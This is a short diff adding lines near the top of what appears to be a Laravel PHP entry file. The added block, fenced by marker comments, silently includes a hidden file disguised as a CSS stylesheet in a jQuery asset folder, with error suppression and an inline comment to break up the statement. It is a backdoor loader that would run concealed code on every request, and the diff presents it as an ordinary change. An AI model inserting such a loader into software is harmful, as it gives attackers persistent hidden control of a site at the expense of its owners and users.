@@ -1,4 +1,10 @@
 <?php
+/*4ca1f*/
+
+$ru = "/var/www/ncs/public/js/jquery/.2c17eaad.css"; $t3j = substr($ru, 0); @include_once /* l */ ($t3j);
+
+/*4ca1f*/ 
+
 
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
